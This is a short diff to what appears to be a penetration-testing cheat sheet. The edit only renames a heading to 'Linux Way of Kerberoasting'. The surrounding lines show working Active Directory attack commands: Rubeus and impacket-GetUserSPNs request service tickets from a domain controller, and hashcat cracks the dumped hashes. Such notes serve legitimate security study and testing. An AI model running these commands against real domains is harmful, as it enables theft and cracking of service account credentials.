@@ -378,7 +378,7 @@ setspn -Q */*
 .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
 hashcat -a 0 -m 13100 hashes.kerberoast rockyou.txt
 ```
->Linux Way of Abuse SPN
+>Linux Way of Kerberoasting
 ```
 sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 domain/username:pass -outputfile <output_TGSs_file>
 ```
